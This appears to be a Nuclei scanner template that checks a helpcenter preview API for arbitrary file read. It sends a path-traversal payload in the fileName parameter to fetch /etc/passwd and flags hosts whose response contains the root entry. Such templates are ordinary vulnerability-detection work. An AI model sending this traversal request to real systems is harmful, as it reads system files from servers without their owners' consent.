id: zgydykzt-preview-anyfileread

info:
  name: zgydykzt-preview-anyfileread
  author: zgydykzt
  severity: high

http:
  - raw:
    - | 
      GET /api/query/helpcenter/api/v2/preview?fileName=../../../../../../../../etc/passwd HTTP/1.1
      Host: {{Hostname}}
      Content-Type: text/plain
      Connection: close

    matchers:
      - type: dsl
        dsl:
         - status_code==200 && contains_all(body,"root:x:0")